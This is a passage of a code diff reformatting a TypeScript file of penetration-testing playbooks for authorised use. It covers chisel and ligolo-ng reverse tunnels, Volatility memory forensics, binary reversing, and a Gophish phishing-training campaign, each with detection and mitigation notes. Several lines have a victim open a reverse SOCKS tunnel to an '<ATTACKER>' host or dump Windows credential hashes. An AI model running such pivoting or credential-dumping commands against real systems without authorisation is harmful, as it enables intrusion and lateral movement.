+            code: "# victim\n./chisel client <ATTACKER>:8000 R:1080:socks",
+            note: "SOCKS5 on attacker:1080.",
+          },
+        ],
+      },
+      {
+        title: "ligolo-ng reverse tunnel",
+        detail: "",
+        commands: [
+          {
+            code: "# attacker\nsudo ip tuntap add user root mode tun ligolo\nsudo ip link set ligolo up\nligolo-proxy -selfcert",
+            note: "",
+          },
+          { code: "# victim\n./agent -connect <ATTACKER>:11601 -ignore-cert", note: "" },
+        ],
+      },
     ],
     errors: [
-      { message: "connect refused via SOCKS", cause: "Egress port blocked.", fix: "Change port to 443, or wrap in TLS." },
+      {
+        message: "connect refused via SOCKS",
+        cause: "Egress port blocked.",
+        fix: "Change port to 443, or wrap in TLS.",
+      },
     ],
-    detection: "Long-lived outbound connections from workstations to unusual IPs, non-HTTP traffic on 80/443.",
-    mitigation: "Egress filtering, TLS interception, DNS-over-HTTPS blocking, network segmentation.",
+    detection:
+      "Long-lived outbound connections from workstations to unusual IPs, non-HTTP traffic on 80/443.",
+    mitigation:
+      "Egress filtering, TLS interception, DNS-over-HTTPS blocking, network segmentation.",
   },
 
   // ─────────────── Forensics / reversing ───────────────
@@ -980,12 +2055,28 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     toolSlugs: ["volatility3"],
     legalNote: LEGAL,
     steps: [
-      { title: "Process list", detail: "", commands: [{ code: "vol -f mem.raw windows.pslist", note: "" }] },
-      { title: "Network connections", detail: "", commands: [{ code: "vol -f mem.raw windows.netscan", note: "" }] },
-      { title: "Hash credentials", detail: "", commands: [{ code: "vol -f mem.raw windows.hashdump", note: "" }] },
+      {
+        title: "Process list",
+        detail: "",
+        commands: [{ code: "vol -f mem.raw windows.pslist", note: "" }],
+      },
+      {
+        title: "Network connections",
+        detail: "",
+        commands: [{ code: "vol -f mem.raw windows.netscan", note: "" }],
+      },
+      {
+        title: "Hash credentials",
+        detail: "",
+        commands: [{ code: "vol -f mem.raw windows.hashdump", note: "" }],
+      },
     ],
     errors: [
-      { message: "No symbols found", cause: "Missing PDB for that Windows build.", fix: "Point Vol3 at a symbols dir with the right ntoskrnl PDB." },
+      {
+        message: "No symbols found",
+        cause: "Missing PDB for that Windows build.",
+        fix: "Point Vol3 at a symbols dir with the right ntoskrnl PDB.",
+      },
     ],
     detection: "N/A — defensive.",
     mitigation: "N/A — this IS mitigation for IR teams.",
@@ -995,17 +2086,37 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     title: "Reverse a binary (Ghidra / radare2 / GDB workflow)",
     category: "Post-Exploitation",
     severity: "low",
-    summary: "Structured RE workflow for CTF or authorised sample analysis: triage → static analysis → dynamic tracing.",
+    summary:
+      "Structured RE workflow for CTF or authorised sample analysis: triage → static analysis → dynamic tracing.",
     prerequisites: ["Isolated VM"],
     toolSlugs: ["ghidra", "radare2-cutter", "gdb", "gdb-peda", "strace", "ltrace"],
     legalNote: LEGAL,
     steps: [
-      { title: "Triage", detail: "", commands: [{ code: "file bin && strings bin | less && checksec bin", note: "" }] },
-      { title: "Static", detail: "", commands: [{ code: "ghidra", note: "Or `r2 -A bin`, then afl / pdf @@ sym.*" }] },
-      { title: "Dynamic", detail: "", commands: [{ code: "gdb -q bin", note: "Use PEDA/GEF/pwndbg extensions." }, { code: "strace -f -e trace=openat,execve ./bin", note: "" }] },
+      {
+        title: "Triage",
+        detail: "",
+        commands: [{ code: "file bin && strings bin | less && checksec bin", note: "" }],
+      },
+      {
+        title: "Static",
+        detail: "",
+        commands: [{ code: "ghidra", note: "Or `r2 -A bin`, then afl / pdf @@ sym.*" }],
+      },
+      {
+        title: "Dynamic",
+        detail: "",
+        commands: [
+          { code: "gdb -q bin", note: "Use PEDA/GEF/pwndbg extensions." },
+          { code: "strace -f -e trace=openat,execve ./bin", note: "" },
+        ],
+      },
     ],
     errors: [
-      { message: "ptrace: Operation not permitted", cause: "yama.ptrace_scope.", fix: "echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope" },
+      {
+        message: "ptrace: Operation not permitted",
+        cause: "yama.ptrace_scope.",
+        fix: "echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope",
+      },
     ],
     detection: "Not applicable.",
     mitigation: "Isolated malware analysis VM without network access.",
@@ -1017,20 +2128,52 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     title: "Authorised phishing campaign with Gophish",
     category: "Social",
     severity: "medium",
-    summary: "Design, send, and measure a phishing training campaign against your own organisation's users with clear escalation and cleanup.",
+    summary:
+      "Design, send, and measure a phishing training campaign against your own organisation's users with clear escalation and cleanup.",
     prerequisites: ["Written authorisation", "Landing page + mail server", "HR + comms plan"],
     toolSlugs: ["gophish"],
     legalNote: LEGAL,
     steps: [
-      { title: "Deploy Gophish", detail: "", commands: [{ code: "./gophish", note: "Admin UI at :3333." }] },
-      { title: "Build sending profile + template", detail: "", commands: [{ code: "# In Gophish UI: Sending Profiles → SMTP + auth; Templates → HTML + tracker pixel", note: "" }] },
-      { title: "Launch campaign to authorised users", detail: "", commands: [{ code: "# Users & Groups → import CSV; Campaigns → Launch New", note: "" }] },
-      { title: "Debrief + train", detail: "", commands: [{ code: "# Send an authorised training message with results and educational content", note: "" }] },
+      {
+        title: "Deploy Gophish",
+        detail: "",
+        commands: [{ code: "./gophish", note: "Admin UI at :3333." }],
+      },
+      {
+        title: "Build sending profile + template",
+        detail: "",
+        commands: [
+          {
+            code: "# In Gophish UI: Sending Profiles → SMTP + auth; Templates → HTML + tracker pixel",
+            note: "",
+          },
+        ],
+      },
+      {
+        title: "Launch campaign to authorised users",
+        detail: "",
+        commands: [{ code: "# Users & Groups → import CSV; Campaigns → Launch New", note: "" }],
+      },
+      {
+        title: "Debrief + train",
+        detail: "",
+        commands: [
+          {
+            code: "# Send an authorised training message with results and educational content",
+            note: "",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "smtp: 550 relay denied", cause: "Sending server not authorised.", fix: "Use an SMTP relay in scope; add SPF/DKIM for the sending domain." },
+      {
+        message: "smtp: 550 relay denied",
+        cause: "Sending server not authorised.",
+        fix: "Use an SMTP relay in scope; add SPF/DKIM for the sending domain.",
+      },
     ],
     detection: "Users reporting phish, SIEM tracking of the tracker URL.",
-    mitigation: "Continuous training, phishing-resistant MFA, mail filters (DMARC/SPF/DKIM), user reporting tools.",
+    mitigation:
+      "Continuous training, phishing-resistant MFA, mail filters (DMARC/SPF/DKIM), user reporting tools.",
   },
 ];
